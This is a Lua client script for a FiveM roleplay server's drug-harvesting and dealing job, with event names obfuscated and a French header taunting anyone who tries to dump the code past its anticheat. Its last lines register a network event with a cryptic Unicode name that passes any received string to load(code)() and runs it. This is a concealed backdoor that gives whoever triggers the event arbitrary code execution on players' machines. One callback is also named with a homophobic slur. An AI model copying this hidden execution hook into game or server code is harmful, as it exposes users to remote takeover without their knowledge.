-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local HasAlreadyEnteredMarker = false

local CurrentAction = nil
local ZonePos = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{ayzwen}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end

ESX.TriggerServerCallback('::{ayzwen}::dumpIsForGayDude', function(gayData)
		Config.Zones = gayData
	end)
end)

AddEventHandler('::{ayzwen}::esx_drugs:hasEnteredMarker', function(zone, pos)
	if zone == 'CokeField' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_collect_coke')
		CurrentActionData = {}
	end

	if zone == 'CokeProcessing' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_process_coke')
		CurrentActionData = {}
	end

	if zone == 'CokeDealer' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_sell_coke')
		CurrentActionData = {}
	end

	if zone == 'MethField' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_collect_meth')
		CurrentActionData = {}
	end

	if zone == 'MethProcessing' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_process_meth')
		CurrentActionData = {}
	end

	if zone == 'MethDealer' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_sell_meth')
		CurrentActionData = {}
	end

	if zone == 'WeedField' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_collect_weed')
		CurrentActionData = {}
	end

	if zone == 'WeedProcessing' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_process_weed')
		CurrentActionData = {}
	end

	if zone == 'WeedDealer' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_sell_weed')
		CurrentActionData = {}
	end

	if zone == 'OpiumField' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_collect_opium')
		CurrentActionData = {}
	end

	if zone == 'OpiumProcessing' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_process_opium')
		CurrentActionData = {}
	end

	if zone == 'OpiumDealer' then
		CurrentAction = zone
		ZonePos = pos
		CurrentActionMsg = _U('press_sell_opium')
		CurrentActionData = {}
	end
end)

AddEventHandler('::{ayzwen}::esx_drugs:hasExitedMarker', function()
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopHarvestCoke')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopTransformCoke')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopSellCoke')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopHarvestMeth')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopTransformMeth')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopSellMeth')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopHarvestWeed')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopTransformWeed')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopSellWeed')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopHarvestOpium')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopTransformOpium')
	_TriggerServerEvent('::{ayzwen}::esx_drugs:stopSellOpium')
	CurrentAction = nil
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone = nil
		local currentPos = nil

		for k, v in pairs(Config.Zones) do
			if #(coords - v) < Config.ZoneSize.x / 2 then
				isInMarker = true
				currentZone = k
				currentPos = v
			end
		end

		if isInMarker and not hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = true
			TriggerEvent('::{ayzwen}::esx_drugs:hasEnteredMarker', currentZone, currentPos)
		end

		if not isInMarker and hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = false
			TriggerEvent('::{ayzwen}::esx_drugs:hasExitedMarker')
		end
	end
end)

RegisterNetEvent('::{ayzwen}::esx_drugs:onPot')
AddEventHandler('::{ayzwen}::esx_drugs:onPot', function()
	ESX.Streaming.RequestAnimSet('MOVE_M@DRUNK@SLIGHTLYDRUNK')

	TaskStartScenarioInPlace(PlayerPedId(), 'WORLD_HUMAN_SMOKING_POT', 0, true)
	Citizen.Wait(5000)
		
	DoScreenFadeOut(1000)
	Citizen.Wait(1000)

	ClearPedTasksImmediately(PlayerPedId())
	SetTimecycleModifier('spectator5')
	SetPedMotionBlur(PlayerPedId(), true)
	SetPedMovementClipset(PlayerPedId(), 'MOVE_M@DRUNK@SLIGHTLYDRUNK', true)
	RemoveAnimSet('MOVE_M@DRUNK@SLIGHTLYDRUNK')
	SetPedIsDrunk(PlayerPedId(), true)
	DoScreenFadeIn(1000)
	Citizen.Wait(120000)

	DoScreenFadeOut(1000)
	Citizen.Wait(1000)

	DoScreenFadeIn(1000)
	ClearTimecycleModifier()
	ResetScenarioTypesEnabled()
	ResetPedMovementClipset(PlayerPedId(), 0.0)
	SetPedIsDrunk(PlayerPedId(), false)
	SetPedMotionBlur(PlayerPedId(), false)
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'CokeField' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startHarvestCoke', ZonePos)
				elseif CurrentAction == 'CokeProcessing' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startTransformCoke', ZonePos)
				elseif CurrentAction == 'CokeDealer' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startSellCoke', ZonePos)
				elseif CurrentAction == 'MethField' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startHarvestMeth', ZonePos)
				elseif CurrentAction == 'MethProcessing' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startTransformMeth', ZonePos)
				elseif CurrentAction == 'MethDealer' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startSellMeth', ZonePos)
				elseif CurrentAction == 'WeedField' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startHarvestWeed', ZonePos)
				elseif CurrentAction == 'WeedProcessing' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startTransformWeed', ZonePos)
				elseif CurrentAction == 'WeedDealer' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startSellWeed', ZonePos)
				elseif CurrentAction == 'OpiumField' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startHarvestOpium', ZonePos)
				elseif CurrentAction == 'OpiumProcessing' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startTransformOpium', ZonePos)
				elseif CurrentAction == 'OpiumDealer' then
					_TriggerServerEvent('::{ayzwen}::esx_drugs:startSellOpium', ZonePos)
				end
				
				CurrentAction = nil
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)